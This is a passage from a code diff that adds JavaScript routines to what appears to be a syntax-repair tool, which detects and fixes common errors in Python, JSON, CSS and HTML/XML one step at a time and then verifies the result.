+    else if(c===')'||c===']'||c==='}'){ if(!st.pop())return{stray:true}; }
+  }
+  return {st};
+}
+function pyScan(code){
+  const stack=[]; let i=0,line=1,q=null,tri=null;
+  const n=code.length;
+  while(i<n){
+    const c=code[i],d=code[i+1]||'',t3=code[i+2]||'';
+    if(tri){ if(c===tri&&d===tri&&t3===tri){tri=null;i+=3;continue;} if(c==='\n')line++; i++; continue; }
+    if(q){ if(c==='\\'){i+=2;continue;} if(c==='\n')return{unterminated:{line,q}}; if(c===q)q=null; i++; continue; }
+    if(c==='#'){ while(i<n&&code[i]!=='\n')i++; continue; }
+    if((c==='"'||c==="'")&&d===c&&t3===c){ tri=c; i+=3; continue; }
+    if(c==='"'||c==="'"){ q=c; i++; continue; }
+    if(c==='\n'){ line++; i++; continue; }
+    if(c==='('||c==='['||c==='{'){ stack.push({c,line}); i++; continue; }
+    if(c===')'||c===']'||c==='}'){
+      const t=stack.pop();
+      const ok=t&&((t.c==='('&&c===')')||(t.c==='['&&c===']')||(t.c==='{'&&c==='}'));
+      if(!ok)return{extra:{index:i,line}};
+      i++; continue;
+    }
+    i++;
+  }
+  if(tri)return{unterminated:{line,q:tri+tri+tri}};
+  if(q)return{unterminated:{line,q}};
+  return {stack};
+}
+const PY_HEAD=/^\s*(if|elif|else|for|while|def|class|try|except|finally|with|match|case)\b/;
+const PY_TYPOS=[
+  [/\bpirnt\b|\bprnt\b|\bpritn\b/g,'print'],
+  [/\blenght\b/g,'length'],
+  [/\bture\b/g,'True'],[/\bflase\b/g,'False'],
+  [/\besle\b/g,'else'],[/\belfi\b/g,'elif'],
+  [/\bcontine\b/g,'continue'],
+  [/\bretrun\b|\bretun\b/g,'return'],
+  [/\bimprot\b/g,'import'],
+  [/\becept\b|\becxept\b/g,'except'],
+  [/\bfnially\b/g,'finally'],
+];
+function pyHitTypo(lines){
+  for(let i=0;i<lines.length;i++){
+    const l=lines[i];
+    if(/^\s*#/.test(l))continue;
+    for(const [re,to] of PY_TYPOS){
+      const m=l.match(re);
+      if(m){
+        const nl=l.replace(re,to);
+        return {code:lines.slice(0,i).concat([nl],lines.slice(i+1)).join('\n'),
+          repair:{rule:'TYPO — '+m[0]+' → '+to,line:i+1,before:trimMid(l),after:trimMid(nl)}};
+      }
+    }
+  }
+  return null;
+}
+function pyHitIndent(code){
+  const lines=code.split('\n');
+  const hasTab=lines.some(l=>/^\t/.test(l));
+  const hasSp=lines.some(l=>/^ {4}/.test(l));
+  if(hasTab&&hasSp){
+    return {code:lines.map(l=>l.replace(/^\t+/,m=>'    '.repeat(m.length))).join('\n'),
+      repair:{rule:'MIXED INDENT — TABS → 4 SPACES',line:1,before:'\\t',after:'    '}};
+  }
+  return null;
+}
+function pyHitStruct(code){
+  const lines=code.split('\n');
+  for(let i=0;i<lines.length;i++){
+    const raw=lines[i];
+    if(!raw.trim()||/^\s*#/.test(raw))continue;
+    const stripped=pyStripComment(raw);
+    const masked=pyMaskStrings(stripped);
+    const commentPart=raw.slice(stripped.length);
+    const ret=(nl,rule)=>({code:lines.slice(0,i).concat([nl],lines.slice(i+1)).join('\n'),
+      repair:{rule,line:i+1,before:trimMid(raw),after:trimMid(nl)}});
+
+    if(/else\s+if\b/.test(stripped)) return ret(raw.replace(/else\s+if\b/,'elif'),'ELSE IF → ELIF');
+
+    let nl2='',hit=false;
+    for(let k=0;k<stripped.length;k++){
+      if(masked[k]){ nl2+=stripped[k]; continue; }
+      if(stripped[k]==='&'&&stripped[k+1]==='&'){ nl2+='and'; k++; hit=true; continue; }
+      if(stripped[k]==='|'&&stripped[k+1]==='|'){ nl2+='or'; k++; hit=true; continue; }
+      if(stripped[k]==='<'&&stripped[k+1]==='>'){ nl2+='!='; k++; hit=true; continue; }
+      nl2+=stripped[k];
+    }
+    if(hit) return ret(nl2+commentPart,'JS OPERATORS → and / or / !=');
+
+    const pm=stripped.match(/^(\s*)print\s+(?!\()(.+)$/);
+    if(pm&&!PY_HEAD.test(pm[2]))
+      return ret(pm[1]+'print('+pm[2].replace(/\s+$/,'')+')'+commentPart,'PY2 PRINT → print(…)');
+
+    if(/^(\s*)(if|elif|while)\b/.test(stripped)){
+      let fixed='',hitEq=false;
+      for(let k=0;k<stripped.length;k++){
+        const c=stripped[k];
+        if(masked[k]){ fixed+=c; continue; }
+        if(c==='='&&stripped[k+1]!=='='&&!['=','!','<','>','+','-','*','/','%','&','|','^',':'].includes(stripped[k-1]||'')){
+          fixed+='=='; hitEq=true; continue;
+        }
+        fixed+=c;
+      }
+      if(hitEq) return ret(fixed+commentPart,'ASSIGNMENT IN CONDITION  =  →  ==');
+    }
+    if(PY_HEAD.test(stripped)){
+      const codePart=stripped.replace(/\s+$/,'');
+      const m2=pyMaskStrings(codePart);
+      let colonAt=-1;
+      for(let k=0;k<codePart.length;k++)if(!m2[k]&&codePart[k]===':'){colonAt=k;break;}
+      const hasBody=colonAt>-1&&/\S/.test(stripped.slice(colonAt+1));
+      if(hasBody)continue;
+      if(codePart.endsWith(':'))continue;
+      if(codePart.endsWith('\\'))continue;
+      const br=pyLineBrackets(codePart);
+      if(br.stray)continue;
+      let deeper=false,nextJ=-1;
+      for(let j=i+1;j<lines.length;j++){ if(lines[j].trim()){ nextJ=j; break; } }
+      const curIndent=raw.match(/^\s*/)[0];
+      if(nextJ===-1)deeper=true;
+      else deeper=lines[nextJ].startsWith(curIndent)&&lines[nextJ].trim().length>0&&lines[nextJ].match(/^\s*/)[0].length>curIndent.length;
+      if(!deeper)continue;
+      const d=br.st.length;
+      const closers={'(':')','[':']','{':'}'};
+      const closeStr=br.st.slice().reverse().map(c=>closers[c]).join('');
+      const out=codePart+closeStr+':'+commentPart;
+      return ret(out, d>0?('MISSING "'+closeStr+'" + ":" ON HEADER'):'MISSING ":" ON HEADER');
+    }
+  }
+  return null;
+}
+function pyOracleOk(code){
+  const s=pyScan(code);
+  if(s.extra||s.stack.length||s.unterminated)return false;
+  const lines=code.split('\n');
+  for(let i=0;i<lines.length;i++){
+    const raw=lines[i];
+    if(!raw.trim()||/^\s*#/.test(raw))continue;
+    const stripped=pyStripComment(raw).replace(/\s+$/,'');
+    if(!PY_HEAD.test(stripped))continue;
+    if(stripped.endsWith(':'))continue;
+    if(stripped.endsWith('\\'))continue;
+    const masked=pyMaskStrings(stripped);
+    let hasRealColon=false;
+    for(let k=0;k<stripped.length;k++)if(!masked[k]&&stripped[k]===':'){hasRealColon=true;break;}
+    if(hasRealColon&&/\S/.test(stripped.slice(stripped.indexOf(':')+1)))continue;
+    return false;
+  }
+  return true;
+}
+function stepPython(code){
+  const pre=preFixOne(code); if(pre)return pre;
+  let r;
+  if(r=pyHitTypo(code.split('\n')))return r;
+  if(r=pyHitIndent(code))return r;
+  if(r=pyHitStruct(code))return r;
+  const s=pyScan(code);
+  if(s.unterminated){
+    const ls2=code.split('\n'),L=s.unterminated.line,q=s.unterminated.q;
+    if(q.length===3)return {code:code.replace(/\s*$/,'')+'\n'+q,repair:{rule:'UNTERMINATED TRIPLE STRING',line:L,before:'"""…',after:'…"""'}};
+    ls2[L-1]=(ls2[L-1]||'').replace(/\s*$/,'')+q;
+    return {code:ls2.join('\n'),repair:{rule:'UNTERMINATED STRING',line:L,before:'…',after:'… '+q}};
+  }
+  if(s.extra){
+    const {line:li,col:ci}=idxToPos(code,s.extra.index);
+    const ls2=code.split('\n');
+    const before=ls2[li]||'';
+    ls2[li]=before.slice(0,ci)+before.slice(ci+1);
+    return {code:ls2.join('\n'),repair:{rule:'STRAY CLOSER',line:li+1,before:trimMid(before),after:trimMid(ls2[li])}};
+  }
+  if(s.stack.length){
+    const map={'(':')','[':']','{':'}'};
+    const cl=s.stack.slice().reverse().map(t=>map[t.c]).join('');
+    return {code:code.replace(/\s*$/,'')+'\n'+cl,
+      repair:{rule:'UNCLOSED BRACKET'+(s.stack.length>1?'S':''),line:s.stack[s.stack.length-1].line,before:'(end of file)',after:cl}};
+  }
+  if(pyOracleOk(code))return {halt:true,clean:true};
+  return {halt:true,clean:false,err:{message:'structure scan still finds problems',line:null}};
+}
+
+/* ---- JSON steps ---- */
+function tryJSON(code){
+  try{ JSON.parse(code); return {ok:true}; }
+  catch(e){
+    const m=e.message||'bad JSON'; let line=null;
+    const lm=m.match(/line (\d+)/); if(lm)line=+lm[1];
+    else{ const pm=m.match(/position (\d+)/); if(pm)line=code.slice(0,+pm[1]).split('\n').length; }
+    return {ok:false,message:m,line};
+  }
+}
+function jsonScan(code){
+  const stack=[]; let q=null;
+  for(let i=0;i<code.length;i++){
+    const c=code[i];
+    if(q){ if(c==='\\'){i++;} else if(c===q)q=null; continue; }
+    if(c==='"'){ q=c; continue; }
+    if(c==='{'||c==='[')stack.push({c});
+    else if(c==='}'||c===']'){
+      const t=stack.pop();
+      const ok=t&&((t.c==='{'&&c==='}')||(t.c==='['&&c===']'));
+      if(!ok)return{extra:{index:i},stack};
+    }
+  }
+  return {extra:null,stack};
+}
+function stripCommentsJ(code){
+  let out=''; let i=0,q=null; const lines=[]; const n=code.length;
+  while(i<n){
+    const c=code[i],d=code[i+1]||'';
+    if(q){ out+=c; if(c==='\\'){ out+=d||''; i+=2; continue; } if(c===q)q=null; i++; continue; }
+    if(c==='"'||c==="'"){ q=c; out+=c; i++; continue; }
+    if(c==='/'&&d==='/'){ lines.push(lineOf(code,i)); let j=code.indexOf('\n',i); if(j===-1)j=n; i=j; continue; }
+    if(c==='/'&&d==='*'){ lines.push(lineOf(code,i)); let j=code.indexOf('*/',i+2); j=(j===-1)?n:j+2; i=j; continue; }
+    out+=c; i++;
+  }
+  return lines.length?{out,lines:[...new Set(lines)]}:null;
+}
+function jsonConvLine(s){
+  let out='',q=null,mod=false;
+  for(let i=0;i<s.length;i++){
+    const c=s[i];
+    if(q==='"'){ out+=c; if(c==='\\'){ out+=s[++i]||''; } else if(c==='"')q=null; continue; }
+    if(q==="'"){
+      if(c==='\\'){ const n2=s[++i]||''; out+=(n2==="'")?"'":(n2==='"'?'\\"':'\\'+n2); continue; }
+      if(c==='"'){ out+='\\"'; continue; }
+      if(c==="'"){ q=null; out+='"'; continue; }
+      out+=c; continue;
+    }
+    if(c==='"'){ q='"'; out+=c; continue; }
+    if(c==="'"){ q="'"; out+='"'; mod=true; continue; }
+    out+=c;
+  }
+  if(q==="'"&&mod)out+='"';
+  return {out,mod};
+}
+function hitSinglesJSON(code){
+  const lines=code.split('\n');
+  for(let i=0;i<lines.length;i++){
+    const r=jsonConvLine(lines[i]);
+    if(r.mod)return {code:lines.slice(0,i).concat([r.out],lines.slice(i+1)).join('\n'),
+      repair:{rule:'SINGLE-QUOTED STRING',line:i+1,before:trimMid(lines[i]),after:trimMid(r.out)}};
+  }
+  return null;
+}
+function hitPyLiterals(code){
+  const mask=strMask(code,'"');
+  const map={True:'true',False:'false',None:'null',NaN:'null',Infinity:'null','-Infinity':'null'};
+  const re=/\b(True|False|None|NaN|-?Infinity)\b/g; let m;
+  while((m=re.exec(code))){
+    if(mask[m.index])continue;
+    const to=map[m[0]]||'null';
+    return {code:code.slice(0,m.index)+to+code.slice(m.index+m[0].length),
+      repair:{rule:'LITERAL — '+m[0]+' → '+to,line:lineOf(code,m.index),before:m[0],after:to}};
+  }
+  return null;
+}
+function hitHexNums(code){
+  const mask=strMask(code,'"');
+  const re=/\b0[xX][0-9a-fA-F]+\b/g; let m;
+  while((m=re.exec(code))){
+    if(mask[m.index])continue;
+    const to=String(parseInt(m[0],16));
+    return {code:code.slice(0,m.index)+to+code.slice(m.index+m[0].length),
+      repair:{rule:'HEX NUMBER — '+m[0]+' → '+to,line:lineOf(code,m.index),before:m[0],after:to}};
+  }
+  return null;
+}
+function hitBareKeys(code){
+  const mask=strMask(code,'"');
+  const re=/[A-Za-z_$][A-Za-z0-9_$-]*(?=\s*:)/g; let m;
+  while((m=re.exec(code))){
+    const ks=m.index;
+    if(mask[ks])continue;
+    let j=ks-1;
+    while(j>=0&&/[ \t\n\r]/.test(code[j]))j--;
+    const prev=j>=0?code[j]:'{';
+    if(prev==='{'||prev===','){
+      return {code:code.slice(0,ks)+'"'+code.slice(ks,ks+m[0].length)+'"'+code.slice(ks+m[0].length),
+        repair:{rule:'BARE KEY',line:lineOf(code,ks),before:m[0]+':',after:'"'+m[0]+'":'}};
+    }
+  }
+  return null;
+}
+function hitTrailingCommas(code){
+  const mask=strMask(code,'"');
+  const re=/,\s*[}\]]/g; let m;
+  while((m=re.exec(code))){
+    if(mask[m.index])continue;
+    return {code:code.slice(0,m.index)+code.slice(m.index+1),
+      repair:{rule:'TRAILING COMMA',line:lineOf(code,m.index),before:'…,',after:'…'}};
+  }
+  return null;
+}
+function jsonPositionalOne(code,p){
+  const msg=(p.message||'').toLowerCase();
+  if(/unexpected end of (json )?input|unexpected end of data/.test(msg)){
+    const s=jsonScan(code);
+    if(s.stack.length){
+      const map={'{':'}','[':']'};
+      const closers=s.stack.slice().reverse().map(t=>map[t.c]).join('');
+      return {code:code.replace(/\s*$/,'')+'\n'+closers,
+        repair:{rule:'UNCLOSED BRACKET'+(s.stack.length>1?'S':''),line:null,before:'(end of file)',after:closers}};
+    }
+    return null;
+  }
+  if(/unterminated string/.test(msg)&&p.line){
+    const lines=code.split('\n'); const line=lines[p.line-1]||'';
+    const q=(line.match(/["']/)||['"'])[0];
+    lines[p.line-1]=line+q;
+    return {code:lines.join('\n'),repair:{rule:'UNTERMINATED STRING',line:p.line,before:'…'+trimMid(line.slice(-30)),after:'…'+q}};
+  }
+  if(/after json/.test(msg)){
+    const pm=(p.message||'').match(/position (\d+)/);
+    if(pm){
+      const cut=+pm[1]; const removed=code.slice(cut).trim();
+      return {code:code.slice(0,cut).replace(/\s*$/,''),
+        repair:{rule:'TRAILING DATA',line:p.line,before:trimMid(removed,30)||'…',after:'(removed)'}};
+    }
+    return null;
+  }
+  if(/expected ','|expected double-quoted property name|expected property name/.test(msg)&&p.line){
+    const lines=code.split('\n'); let li=p.line-2;
+    while(li>=0&&!lines[li].trim())li--;
+    if(li>=0&&/["\d\w\]\}e]$/.test(lines[li].trimEnd())){
+      const before=lines[li];
+      lines[li]=lines[li].replace(/\s*$/,'')+',';
+      return {code:lines.join('\n'),repair:{rule:'MISSING ","',line:li+1,before:trimMid(before),after:trimMid(lines[li])}};
+    }
+  }
+  return null;
+}
+function stepJSON(code){
+  const pre=preFixOne(code); if(pre)return pre;
+  const cm=stripCommentsJ(code);
+  if(cm)return {code:cm.out,repair:{rule:'COMMENT'+(cm.lines.length>1?'S':''),line:cm.lines[0],before:'// … /* … */',after:'(removed)'}};
+  let r;
+  if(r=hitSinglesJSON(code))return r;
+  if(r=hitPyLiterals(code))return r;
+  if(r=hitHexNums(code))return r;
+  if(r=hitBareKeys(code))return r;
+  if(r=hitTrailingCommas(code))return r;
+  const p=tryJSON(code);
+  if(p.ok)return {halt:true,clean:true};
+  const pos=jsonPositionalOne(code,p);
+  if(pos)return pos;
+  return {halt:true,clean:false,err:{message:(p.message||'invalid JSON').replace(/^JSON\.parse: */,''),line:p.line}};
+}
+
+/* ---- CSS steps ---- */
+const CSS_TYPOS=[
+  [/\b(dispaly)(\s*:)/g,'display$2'],[/\b(heigth)(\s*:)/g,'height$2'],
+  [/\b(positon|positoin)(\s*:)/g,'position$2'],[/\b(backgroud|backgraound)(\s*:)/g,'background$2'],
+  [/\b(colour)(\s*:)/g,'color$2'],[/\b(font-familly|font-famiy)(\s*:)/g,'font-family$2'],
+  [/\b(bordr|bordre)(\s*:)/g,'border$2'],[/\b(bulr)(\s*:)/g,'blur$2'],
+];
+function oddBlockComment(code){
+  let q=null,depth=0;
+  for(let i=0;i<code.length;i++){
+    const c=code[i],d=code[i+1]||'';
+    if(q){ if(c==='\\'){i++;} else if(c===q)q=null; continue; }
+    if(c==='"'||c==="'"){ q=c; continue; }
+    if(c==='/'&&d==='*'){ depth++; i++; continue; }
+    if(c==='*'&&d==='/'&&depth>0){ depth--; i++; continue; }
+  }
+  return depth>0;
+}
+function cssScan(code){
+  const stack=[]; let q=null,lc=false,bc=false,line=1;
+  for(let i=0;i<code.length;i++){
+    const c=code[i],d=code[i+1]||'';
+    if(lc){ if(c==='\n'){lc=false;line++;} continue; }
+    if(bc){ if(c==='\n')line++; if(c==='*'&&d==='/'){bc=false;i++;} continue; }
+    if(q){ if(c==='\\'){i++;} else if(c===q)q=null; continue; }
+    if(c==='"'||c==="'"){ q=c; continue; }
+    if(c==='/'&&d==='/'){ lc=true; i++; continue; }
+    if(c==='/'&&d==='*'){ bc=true; i++; continue; }
+    if(c==='{')stack.push({c,line});
+    else if(c==='}'){ if(!stack.pop())return{extra:{index:i,line},stack}; }
+    if(c==='\n')line++;
+  }
+  return {extra:null,stack};
+}
+function cssDepthBefore(lines,i){
+  let d=0;
+  for(let k=0;k<i;k++){
+    const t=lines[k].replace(/(["'])(?:(?!\1).)*\1/g,'');
+    for(const ch of t){ if(ch==='{')d++; else if(ch==='}')d--; }
+  }
+  return d;
+}
+function stepCSS(code){
+  const pre=preFixOne(code); if(pre)return pre;
+  const lines=code.split('\n');
+  for(let i=0;i<lines.length;i++){
+    for(const [re,to] of CSS_TYPOS){
+      const m=lines[i].match(re);
+      if(m){
+        const nl=lines[i].replace(re,to);
+        return {code:lines.slice(0,i).concat([nl],lines.slice(i+1)).join('\n'),
+          repair:{rule:'CSS TYPO — '+m[1],line:i+1,before:trimMid(lines[i]),after:trimMid(nl)}};
+      }
+    }
+  }
+  if(/!\s*improtant|!\s*importantt/.test(code))
+    return {code:code.replace(/!\s*improtant|!\s*importantt/g,'!important'),
+      repair:{rule:'TYPO — !IMPORTANT',line:1,before:'!improtant',after:'!important'}};
+  if(oddBlockComment(code))
+    return {code:code.replace(/\s*$/,'')+'\n*/',repair:{rule:'UNTERMINATED COMMENT',line:lines.length,before:'/* …',after:'… */'}};
+  const s=cssScan(code);
+  if(s.extra){
+    const {line:li,col:ci}=idxToPos(code,s.extra.index);
+    const before=lines[li]||'';
+    const nl=before.slice(0,ci)+before.slice(ci+1);
+    return {code:lines.slice(0,li).concat([nl],lines.slice(li+1)).join('\n'),
+      repair:{rule:'STRAY "}"',line:li+1,before:trimMid(before),after:trimMid(nl)}};
+  }
+  if(s.stack.length){
+    const reps='}'.repeat(s.stack.length);
+    return {code:code.replace(/\s*$/,'')+'\n'+reps,
+      repair:{rule:'UNCLOSED BRACE'+(s.stack.length>1?'S':''),line:s.stack[s.stack.length-1].line,before:'(end of file)',after:reps}};
+  }
+  for(let i=1;i<lines.length;i++){
+    const prev=lines[i-1],cur=lines[i];
+    const pt=prev.trim(),ct=cur.trim();
+    if(!pt||!ct)continue;
+    if(/^[A-Za-z-]+\s*:\s*[^{}]*$/.test(pt)&&!/[;{}\/]$/.test(pt)
+       &&!ct.startsWith('}')&&!ct.startsWith('/*')
+       &&(ct.includes(':')||ct.startsWith('}')||/^[.#&\w\[][^{}]*\{/.test(ct))){
+      const nl=prev.replace(/\s*$/,'')+';';
+      return {code:lines.slice(0,i-1).concat([nl],lines.slice(i)).join('\n'),
+        repair:{rule:'MISSING ";"',line:i,before:'…'+trimMid(pt),after:'…;'}};
+    }
+  }
+  for(let i=1;i<lines.length;i++){
+    const prev=lines[i-1],cur=lines[i];
+    const pt=prev.trim();
+    if(!cur.trim().startsWith('}')||!pt)continue;
+    if(/^[A-Za-z-]+\s*:\s*[^{};]+$/.test(pt)){
+      const nl=prev.replace(/\s*$/,'')+';';
+      return {code:lines.slice(0,i-1).concat([nl],lines.slice(i)).join('\n'),
+        repair:{rule:'MISSING ";"',line:i,before:'…'+trimMid(pt),after:'…;'}};
+    }
+    if(/^[A-Za-z-]+\s*:\s*[^{};]+\}.*$/.test(pt)){
+      const nl=cur.replace(/([^;{}])\}/,'$1;}');
+      if(nl!==cur)return {code:lines.slice(0,i).concat([nl],lines.slice(i+1)).join('\n'),
+        repair:{rule:'MISSING ";"',line:i+1,before:trimMid(cur),after:trimMid(nl)}};
+    }
+  }
+  for(let i=0;i<lines.length;i++){
+    const t=lines[i].trim();
+    if(!t||t.includes(':')||t.startsWith('@')||t.startsWith('/')||t.includes('{')||t.includes('}'))continue;
+    const m=t.match(/^([A-Za-z-]{2,})(\s+)([^:;{}][^;{}]*?)(;?)$/);
+    if(m&&cssDepthBefore(lines,i)>0){
+      const nt=m[1]+':'+m[2]+m[3]+m[4];
+      const nl=lines[i].replace(t,nt);
+      return {code:lines.slice(0,i).concat([nl],lines.slice(i+1)).join('\n'),
+        repair:{rule:'MISSING ":"',line:i+1,before:trimMid(t),after:trimMid(nt)}};
+    }
+  }
+  const ok=!s.extra&&!s.stack.length&&!oddBlockComment(code);
+  return {halt:true,clean:ok,err:ok?null:{message:'stylesheet still unbalanced',line:null}};
+}
+
+/* ---- HTML / XML steps ---- */
+const VOID_EL=new Set(['area','base','br','col','embed','hr','img','input','link','meta','param','source','track','wbr']);
+const RAWTEXT=new Set(['script','style','textarea','title']);
+const SINGULAR=new Set(['html','head','body']);
+function htmlPass(code,VOID,RAW){
+  VOID=VOID||VOID_EL; RAW=RAW||RAWTEXT;
+  const lower=code.toLowerCase();
+  let pos=0; const cRanges=[];
+  for(;;){
+    const a=lower.indexOf('<!--',pos); if(a===-1)break;
+    const b=lower.indexOf('-->',a+4);
+    if(b===-1)return{fix:{t:'appendEnd',text:'-->',rule:'UNTERMINATED COMMENT',line:lineOf(code,a),after:'-->'}};
+    cRanges.push([a,b+3]); pos=b+3;
+  }
+  const inComment=i=>cRanges.some(r=>i>=r[0]&&i<r[1]);
+  const rawRe=/<(script|style|textarea|title)\b[^>]*>/gi;
+  const rawRanges=[]; let rm;
+  while((rm=rawRe.exec(code))){
+    if(inComment(rm.index))continue;
+    const tag=rm[1].toLowerCase();
+    const close=lower.indexOf('</'+tag,rm.index+rm[0].length);
+    const end=close===-1?code.length:lower.indexOf('>',close);
+    const stop=(end===-1||end===-2)?code.length:end+1;
+    rawRanges.push([rm.index,stop]);
+    rawRe.lastIndex=stop;
+  }
+  const inRaw=i=>rawRanges.some(r=>i>=r[0]&&i<r[1]);
+  const openT=/<(\/?[a-zA-Z][\w:-]*)/g; let om;
+  while((om=openT.exec(code))){
+    if(inComment(om.index)||inRaw(om.index))continue;
+    let j=openT.lastIndex,terminated=false;
+    while(j<code.length){
+      const ch=code[j];
+      if(ch==='>'){terminated=true;break;}
+      if(ch==='<')break;
+      j++;
+    }
+    if(!terminated){
+      return{fix:{t:'insert',pos:j,text:'>',rule:'MALFORMED TAG — MISSING ">"',
+        line:lineOf(code,om.index),before:om[0],after:'…>'}};
+    }
+  }
+  const mj=/<(\/?[a-zA-Z][\w:-]*)\?+>/.exec(code);
+  if(mj){
+    const junkStart=mj.index+1+mj[1].length;
+    const junkEnd=mj.index+mj[0].length-1;
+    return{fix:{t:'cut',start:junkStart,end:junkEnd,rule:'MALFORMED TAG — STRAY "?"',line:lineOf(code,mj.index),before:mj[0],after:'<'+mj[1]+'>'}};
+  }
+  const tagRe=/<(\/?)([a-zA-Z][\w:-]*)((?:"[^"]*"|'[^']*'|[^>"'])*)(\/?)>/g;
+  const stack=[]; let m;
+  while((m=tagRe.exec(code))){
+    if(inComment(m.index))continue;
+    const full=m[0],solid=m[1]==='/',tag=m[2].toLowerCase(),selfc=m[4]==='/';
+    if(!solid){
+      if(SINGULAR.has(tag)&&VOID===VOID_EL&&stack.some(s=>s.tag===tag)){
+        return{fix:{t:'cut',start:m.index,end:m.index+full.length,rule:'DUPLICATE <'+tag.toUpperCase()+'> — REMOVED',line:lineOf(code,m.index),before:full}};
+      }
+      stack.push({tag,line:lineOf(code,m.index)});
+      if(RAW.has(tag)&&!selfc){
+        const end=lower.indexOf('</'+tag,m.index+full.length);
+        if(end===-1)return{fix:{t:'appendEnd',text:'</'+tag+'>',rule:'UNTERMINATED <'+tag.toUpperCase()+'>',line:lineOf(code,m.index),after:'</'+tag+'>'}};
+        tagRe.lastIndex=end;
+      }
+    } else {
+      let d=-1;
+      for(let k=stack.length-1;k>=0;k--)if(stack[k].tag===tag){ d=k; break; }
+      if(d===-1)return{fix:{t:'cut',start:m.index,end:m.index+full.length,rule:'STRAY </'+tag.toUpperCase()+'>',line:lineOf(code,m.index),before:full}};
+      if(d<stack.length-1){
+        const need=[];
+        for(let k=stack.length-1;k>d;k--)need.push('</'+stack[k].tag+'>');
+        return{fix:{t:'insert',pos:m.index,text:need.join(''),rule:'AUTO-CLOSED <'+stack[stack.length-1].tag.toUpperCase()+'>',line:lineOf(code,m.index),after:need.join('')}};
+      }
+      stack.pop();
+    }
+  }
+  if(stack.length){
+    const need=stack.slice().reverse().map(t=>'</'+t.tag+'>').join('');
+    const last=stack[stack.length-1];
+    return{fix:{t:'appendEnd',text:need,rule:'UNCLOSED <'+last.tag.toUpperCase()+'>',line:last.line,after:need}};
+  }
+  return {ok:true};
+}
+function stepHTML(code,VOID,RAW){
+  VOID=VOID||VOID_EL; RAW=RAW||RAWTEXT;
+  const f=stripFences(code);
+  if(f)return {code:f.code,repair:{rule:'MARKDOWN FENCE',line:f.line,before:'```…',after:'(removed)'}};
+  const ln=/(^|\n)([ \t]*\d+)(?=[ \t]*(?:<|$|\r?\n))/.exec(code);
+  if(ln){
+    const at=ln.index+ln[1].length;
+    return {code:code.slice(0,at)+code.slice(at+ln[2].length),
+      repair:{rule:'PASTE ARTIFACT — LINE NUMBER',line:lineOf(code,at),before:ln[2],after:'(removed)'}};
+  }
+  const res=htmlPass(code,VOID,RAW);
+  if(res.ok)return {halt:true,clean:true};
+  const fx=res.fix;
+  if(fx.t==='appendEnd')return {code:code.replace(/\s*$/,'')+'\n'+fx.text,
+    repair:{rule:fx.rule,line:fx.line,before:fx.before||'(end of file)',after:fx.after}};
+  if(fx.t==='insert')return {code:code.slice(0,fx.pos)+fx.text+code.slice(fx.pos),
+    repair:{rule:fx.rule,line:fx.line,before:fx.before||'…',after:fx.after}};
+  return {code:code.slice(0,fx.start)+code.slice(fx.end),
+    repair:{rule:fx.rule,line:fx.line,before:fx.before||'…',after:fx.after||'(removed)'}};
+}
+function xmlVerify(code){
+  try{
+    const doc=new DOMParser().parseFromString(code,'text/xml');
+    const pe=doc.getElementsByTagName('parsererror');
+    if(pe.length)return{ok:false,message:(pe[0].textContent||'XML parse error').split('\n')[0].trim().slice(0,130)};
+    return {ok:true,elements:doc.getElementsByTagName('*').length};
+  }catch(e){ return {ok:false,message:'XML parse error'}; }
+}
+
+const STEPS={
+  js:stepJS, java:stepJava, python:stepPython, json:stepJSON, css:stepCSS,
+  html:c=>stepHTML(c), xml:c=>stepHTML(c,new Set(),new Set())
+};
+
+/* ---------------- probes & final verification ---------------- */
+function probeLang(lang,code){
+  try{
+    switch(lang){
+      case 'js':{const p=parseJS(code);return{ok:p.ok,msg:p.ok?'parses clean':(p.message||'syntax error'),line:p.line};}
+      case 'java':{const p=parseJava(code);return{ok:p.ok,msg:p.ok?'grammar accepts':p.msg||'syntax error',line:p.line};}
+      case 'json':{const p=tryJSON(code);return{ok:p.ok,msg:p.ok?'JSON.parse OK':(p.message||'invalid JSON').replace(/^JSON\.parse: */,''),line:p.line};}
+      case 'html':{const r=htmlPass(code);return r.ok?{ok:true,msg:'tags balanced',line:null}:{ok:false,msg:r.fix.rule,line:r.fix.line};}
+      case 'xml':{
+        const st=htmlPass(code,new Set(),new Set());
+        if(!st.ok)return{ok:false,msg:st.fix.rule,line:st.fix.line};
+        const v=xmlVerify(code);
+        return v.ok?{ok:true,msg:'DOMParser: well-formed',line:null}:{ok:false,msg:v.message||'XML parse error',line:null};
+      }
+      case 'css':{const s=cssScan(code);const ok=!s.extra&&!s.stack.length&&!oddBlockComment(code);return{ok,msg:ok?'balanced':'unbalanced',line:null};}
+      case 'python':{
+        const s=pyScan(code);
+        if(s.unterminated)return{ok:false,msg:'unterminated string',line:s.unterminated.line};
+        if(s.extra)return{ok:false,msg:'stray closer',line:s.extra.line};
+        if(s.stack.length)return{ok:false,msg:'unclosed bracket',line:s.stack[s.stack.length-1].line};
+        const h=pyOracleOk(code);
+        return{ok:h,msg:h?'structure OK':'header missing colon',line:null};
+      }
+    }
+  }catch(e){}
+  return {ok:false,msg:'probe failed',line:null};
+}
+function verifyFinal(lang,code){
+  switch(lang){
+    case 'js':{const p=parseJS(code);return{ok:p.ok,err:p.ok?null:{message:p.message||'syntax error',line:p.line}};}
+    case 'java':{const p=parseJava(code);return{ok:p.ok,tokens:p.tokens,types:p.types,err:p.ok?null:{message:p.msg||'syntax error',line:p.line}};}
+    case 'json':{const p=tryJSON(code);return{ok:p.ok,err:p.ok?null:{message:(p.message||'invalid JSON').replace(/^JSON\.parse: */,''),line:p.line}};}
+    case 'css':{const s=cssScan(code);const ok=!s.extra&&!s.stack.length&&!oddBlockComment(code);return{ok,err:ok?null:{message:'stylesheet still unbalanced',line:null}};}
+    case 'python':{const s=pyScan(code);const ok=!s.extra&&!s.stack.length&&!s.unterminated&&pyOracleOk(code);
+      return{ok,err:ok?null:{message:'structure scan still finds problems',line:(s.extra&&s.extra.line)||(s.unterminated&&s.unterminated.line)||null}};}
+    case 'html':{const ok=htmlPass(code).ok===true;return{ok,err:ok?null:{message:'tags still unbalanced',line:null}};}
+    case 'xml':{
+      const st=htmlPass(code,new Set(),new Set());
+      if(st.ok!==true)return{ok:false,err:{message:st.fix.rule,line:st.fix.line}};
+      const v=xmlVerify(code);
+      return{ok:v.ok,elements:v.ok?v.elements:undefined,err:v.ok?null:{message:v.message||'XML parse error',line:null}};
+    }
+  }
+  return {ok:false,err:{message:'unknown language'}};
+}
+
+/* ---------------- session loop ---------------- */
+function makeSession(lang,src){
+  const step=STEPS[lang];
+  let code=src,n=0,done=false,halted=null,lastSig=null,streak=0;
